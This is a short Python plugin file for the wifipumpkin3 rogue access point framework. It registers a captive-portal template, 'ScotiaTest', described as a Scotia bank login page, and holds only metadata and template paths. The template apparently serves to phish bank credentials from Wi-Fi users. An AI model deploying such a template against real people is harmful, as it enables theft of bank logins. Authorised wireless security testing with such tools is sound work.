from wifipumpkin3.plugins.captiveflask.plugin import CaptiveTemplatePlugin
import wifipumpkin3.core.utility.constants as C

class Scotia(CaptiveTemplatePlugin):
    Name = "ScotiaTest"
    Version = "1.0"
    Description = "Template for Scotia page login"
    Author = "Meet Patel"
    TemplatePath = C.TEMPLATES_FLASK + "templates/ScotiaTest"
    StaticPath = C.TEMPLATES_FLASK + "templates/ScotiaTest/static"
    Preview = C.TEMPLATES_FLASK + "templates/ScotiaTest/preview.png"